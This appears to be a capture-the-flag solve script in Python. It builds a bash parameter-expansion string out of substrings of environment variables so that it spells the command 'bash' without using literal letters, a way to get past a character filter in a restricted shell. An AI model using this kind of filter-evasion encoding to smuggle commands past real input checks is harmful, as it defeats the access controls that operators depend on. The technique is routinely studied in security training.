variables = {
	"A":"T",
	"AB":"HI",
	"ABC":"ISN",
	"ABCD":"OTTH",
	"ABCDE":"EFLAG",
	"ABCDEF":"BUTMAY",
	"ABCDEFG":"BEITCAN",
	"ABCDEFGH":"HELPGETT",
	"ABCDEFGHI":"INGFLAG:D",
	"HOSTNAME": "ip-172-31-47-5",
	"SHLVL": "1",
	"OLDPWD": "",
	"_": "export",
	"TERM": "dumb",
	"OSTYPE": "linux-gnu",
	"PWD": "/home/special",
	"MACHTYPE": "x86_64-pc-linux-gnu",
	"PATH": "/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.:"
}

def get_length_var(length):
	for var in variables:
		if len(variables[var]) == length:
			return var

	return False

target = "bash"

out = ""
for t in target:
	l = len(out)
	for var in variables:
		val = variables[var]
		if t in val:
			idx = val.index(t)
			v = get_length_var(idx)
			if v:
				out += "${{{}:${{#{}}}:${{#A}}}}".format(var, v)
				break
	
	if len(out) == l:
		print("Couldn't find letter '{}' or variable of suitable length, skipping".format(t))

print(out)